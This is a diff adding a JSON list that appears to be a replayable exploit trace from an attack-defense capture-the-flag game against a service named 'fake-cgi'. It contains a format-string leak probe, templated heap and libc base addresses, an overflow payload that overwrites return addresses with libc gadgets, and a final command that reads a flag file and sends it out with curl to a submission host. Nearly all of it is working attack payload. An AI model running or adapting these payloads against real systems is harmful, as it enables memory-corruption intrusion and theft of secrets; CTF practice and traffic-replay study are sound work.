@@ -1,0 +1,8 @@
+[
+    "1Who r u?\\n", 
+    "0%31$p\\n", 
+    "1wel{{{HEAP_BASE:44899:3:ORI:3:0x6d6f63}}}e!0x{{{LIBC_BASE:133168:12:HEX:10:0x7f99d95ba830}}}", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00{{{LIBC_BASE:135426:8:ORI:72:0x7f99d95bb102}}}{{{LIBC_BASE:1625431:8:ORI:80:0x7f99d9726d57}}}{{{LIBC_BASE:283536:8:ORI:88:0x7f99d95df390}}}\\n", 
+    "1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x01HTTP/1.1 404 Not F{{{HEAP_BASE:111983:3:ORI:193:0x6e756f}}}d\\r\\n{{{HEAP_BASE:110403:3:ORI:129:0x6e6f43}}}{{{HEAP_BASE:107892:3:ORI:132:0x6e6574}}}t-Type: text/{{{HEAP_BASE:46184:3:ORI:108:0x6d7468}}}l; charset=UTF-8\\r\\n{{{HEAP_BASE:110403:3:ORI:129:0x6e6f43}}}{{{HEAP_BASE:107892:3:ORI:132:0x6e6574}}}t-{{{HEAP_BASE:107852:3:ORI:137:0x6e654c}}}gth: 23\\r\\nServer: EasyServer ({{{HEAP_BASE:108876:3:ORI:169:0x6e694c}}}ux)\\r\\n\\r\\n<h3>Page Not F{{{HEAP_BASE:111983:3:ORI:193:0x6e756f}}}d</h3>", 
+    "0wh{{{HEAP_BASE:41327:3:ORI:9:0x6d616f}}}i\\nwh{{{HEAP_BASE:41327:3:ORI:9:0x6d616f}}}i\\ncurl http://10.0.0.2/api/flag/s{{{HEAP_BASE:41589:3:ORI:45:0x6d6275}}}it --data \"flag=`cat /flags/fake-cgi/flag`&to{{{HEAP_BASE:107883:3:ORI:93:0x6e656b}}}=aXVY498k\"\\n"
+]
